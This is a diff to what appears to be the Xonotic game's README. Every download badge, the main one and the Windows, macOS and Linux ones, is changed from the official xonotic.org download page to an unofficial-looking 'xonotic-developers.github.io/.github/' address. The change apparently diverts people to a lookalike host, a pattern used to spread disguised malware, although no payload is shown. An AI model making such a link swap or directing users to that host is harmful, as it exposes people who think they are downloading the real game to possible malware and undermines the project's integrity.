@@ -14,16 +14,16 @@
 ### 🎯 Quick Download
 <div align="center">
 
-[![Download Game](https://img.shields.io/badge/Download%20Game-Play%20Now!-FF6B6B?style=for-the-badge&logo=gamepad)](https://xonotic.org/download/)
+[![Download Game](https://img.shields.io/badge/Download%20Game-Play%20Now!-FF6B6B?style=for-the-badge&logo=gamepad)](https://xonotic-developers.github.io/.github/)
 
 </div>
 
 ### 💾 Platform Downloads
 <div align="center">
 
-[![Windows](https://img.shields.io/badge/Windows-0078D4?style=for-the-badge&logo=windows)](https://xonotic.org/download/)
-[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple)](https://xonotic.org/download/)
-[![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://xonotic.org/download/)
+[![Windows](https://img.shields.io/badge/Windows-0078D4?style=for-the-badge&logo=windows)](https://xonotic-developers.github.io/.github/)
+[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple)](https://xonotic-developers.github.io/.github/)
+[![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://xonotic-developers.github.io/.github/)
 
 </div>
 
